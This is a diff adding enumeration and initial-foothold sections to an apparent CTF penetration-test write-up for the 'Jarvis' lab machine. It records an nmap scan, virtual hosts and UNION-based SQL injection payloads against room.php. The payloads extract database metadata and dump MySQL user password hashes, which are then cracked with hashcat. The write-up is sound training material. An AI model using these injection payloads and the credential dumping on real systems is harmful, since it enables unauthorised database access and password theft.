@@ -61,3 +61,88 @@ A standard OSCP-aligned methodology was followed:
 - Full root via custom SUID `systemctl` service enumeration
 
 ---
+
+## 4. Service Enumeration
+
+### 4.1 Nmap Results
+
+```
+nmap -p- -T4 -sCV -oA jarvis_initial 10.129.229.137
+```
+
+Open ports:
+| Port | Service | Notes |
+|------|---------|-------|
+| 80 | HTTP | Main web app (`supersecurehotel.htb`) |
+| 64999 | HTTP | Secondary admin interface |
+| 3306 | MySQL | Local DB, later used for SQLi |
+| Others | - | Standard Linux services | 
+
+Virtual hosts discovered:
+```
+supersecurehotel.htb
+logger.htb
+```
+Added to `/etc/hosts/`.
+
+Directory brute force revealed:
+- `/phpmyadmin/`
+- `/room.php?cod=`
+
+---
+
+## 5. Initial Foothold
+
+### 5.1 SQL Injection in `room.php?cod=`
+
+Testing revealed filtering bypassed using `ORDER BY` and `UNION` injections:
+```
+?cod=1'
+?cod=1 ORDER BY 7
+?cod=999 UNION SELECT "1","2","3","4","5","6","7" 
+```
+Confirmed **7 columns**.
+
+Extracted system info using:
+```
+?cod=999 UNION SELECT "1","2",CONCAT_WS(':',@@version,user(),database()),"4","5","6","7" 
+```
+
+Result:
+- MariaDB 10.1.48
+- User: DBadmin
+- DB: hotel
+
+### 5.2 Full MySQL Enumeration
+
+Pulled all schema names
+```
+(select group_concat(schema_name) from information_schema.schemata)
+```
+
+Pulled table / column names:
+```
+(select group_concat(table_name,':',column_name) from information_schema.columns where table_schema='hotel')
+
+```
+
+Dumped MySQL user table:
+```
+(select group_concat(host,':',user,':',password) from mysql.user)
+```
+
+Extracted hash:
+```
+DBadmin: *REDACTED*
+```
+
+Cracked with hashcat:
+```
+hashcat -a 0 -m 300 hash.txt rockyou.txt
+```
+
+**Password:** *REDACTED*
+
+This logs into phpMyAdmin.
+
+---
